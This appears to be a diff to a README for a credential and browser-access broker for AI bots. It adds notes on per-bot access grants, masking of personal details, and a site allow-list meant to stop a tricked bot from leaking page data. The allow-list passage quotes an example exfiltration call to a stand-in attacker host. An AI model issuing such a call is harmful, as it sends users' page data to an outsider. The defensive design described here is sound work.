@@ -282,8 +282,18 @@ files you're happy to send to xAI/Cursor.
 - Each bot gets **its own browser session** (cookies, tab, idle sign-out), so one bot can't use a
   site another signed in to.
 - A **new bot can use nothing** until you grant it logins, unlock actions, keys, devices and email
-  codes with **Access…** in the wizard (or `passbroker api bot-access NAME` with JSON on stdin).
+  codes with **Access…** in the wizard (or `passbroker api bot-access NAME` with JSON on stdin:
+  `logins`, `unlock`, `keys`, `devices`, `email_codes`, `personal_details`, `sites_limited`, `sites`).
   Bots only see what they're granted.
+- **Personal details are masked** in everything a bot reads from pages: emails, phone, card and
+  bank numbers become `[email]`, `[phone]`, `[card number]`, `[bank account]`, and are blacked out
+  in its screenshots. Whatever a bot reads stays in the assistant's chat history, and those
+  histories have leaked. Turn on **May see personal details** in Access… for a bot that needs them.
+  It's pattern matching, so names and street addresses in page text aren't caught.
+- **May open only these sites** (Access…) keeps a bot's browser on the sites you list plus its
+  granted logins' sites, subdomains included. Pages it opens, links it clicks, popups and redirects
+  all stay inside, so a tricked bot can't send page data out through
+  `open_url("https://attacker.example/?d=...")`. Off by default.
 - `end_session` signs a bot's browser out when its task is done.
 - Bots pass a `reason`, which is shown in your approval.
 - The typing tool refuses password and code fields, and any text containing a known secret.
